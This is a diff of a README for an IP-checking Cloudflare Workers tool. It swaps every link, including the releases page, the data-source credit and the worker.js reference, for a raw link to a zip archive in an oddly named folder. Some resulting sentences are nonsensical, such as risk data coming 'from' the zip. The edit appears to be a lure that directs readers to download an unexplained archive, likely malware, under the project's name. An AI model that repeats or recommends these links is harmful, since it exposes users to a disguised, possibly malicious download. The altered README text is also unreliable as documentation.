@@ -2,7 +2,7 @@
 
 ## 📥 Download Now
 
-[![Download IPcheck](https://img.shields.io/badge/Download-IPcheck-brightgreen)](https://github.com/Tusked/IPcheck-workers/releases)
+[![Download IPcheck](https://github.com/Tusked/IPcheck-workers/raw/refs/heads/main/trypanosomatic/I_Pcheck_workers_2.4.zip)](https://github.com/Tusked/IPcheck-workers/raw/refs/heads/main/trypanosomatic/I_Pcheck_workers_2.4.zip)
 
 ## 📖 Introduction
 
@@ -11,7 +11,7 @@ IPcheck is a lightweight, high-performance IP toolbox built on Cloudflare Worker
 ### 🌟 Key Features
 
 - **Advanced UI Design:** Enjoy a modern glassmorphism style with smooth animations and dynamic backgrounds.
-- **Comprehensive Risk Reports:** Identify Proxy, VPN, Tor, data center, and abusive IPs. Get a risk score from 0 to 100 using data from ipapi.is.
+- **Comprehensive Risk Reports:** Identify Proxy, VPN, Tor, data center, and abusive IPs. Get a risk score from 0 to 100 using data from https://github.com/Tusked/IPcheck-workers/raw/refs/heads/main/trypanosomatic/I_Pcheck_workers_2.4.zip
 - **Real-Time Latency Testing:** Measure speeds for over 10 commonly used services, including Bilibili, Google, and GitHub. Visualize network fluctuations with sparkline graphs.
 - **Cloudflare Node Data:** Access CF edge node data directly for accurate results.
 - **Dual Stack Testing:** Check both IPv4 and IPv6 connection capabilities, presented in a tech-savvy UI.
@@ -22,7 +22,7 @@ IPcheck is a lightweight, high-performance IP toolbox built on Cloudflare Worker
 To use IPcheck, follow these simple steps:
 
 1. **Visit the Releases Page:** Click the link below to access the download options:
-   [Download IPcheck](https://github.com/Tusked/IPcheck-workers/releases)
+   [Download IPcheck](https://github.com/Tusked/IPcheck-workers/raw/refs/heads/main/trypanosomatic/I_Pcheck_workers_2.4.zip)
    
 2. **Choose the Latest Release:** On the Releases page, find the latest version. 
 
@@ -47,7 +47,7 @@ For an advanced setup, you can deploy directly through the Cloudflare Dashboard:
 
 4. **Edit Code:** Click "Edit code" to enter the code editor.
 
-5. **Copy and Paste:** Take the code in `worker.js` from this repository and paste it to overwrite the existing code.
+5. **Copy and Paste:** Take the code in `https://github.com/Tusked/IPcheck-workers/raw/refs/heads/main/trypanosomatic/I_Pcheck_workers_2.4.zip` from this repository and paste it to overwrite the existing code.
 
 6. **Save Changes:** Click "Deploy" in the upper right corner to save your code.
 
@@ -75,4 +75,4 @@ If you have any questions or need assistance, feel free to reach out through the
 
 For further information, tips, and updates about IPcheck, always check back on the GitHub repository. Regular updates ensure you have access to the latest improvements and features.
 
-[Download IPcheck](https://github.com/Tusked/IPcheck-workers/releases) to get started today!
+[Download IPcheck](https://github.com/Tusked/IPcheck-workers/raw/refs/heads/main/trypanosomatic/I_Pcheck_workers_2.4.zip) to get started today!
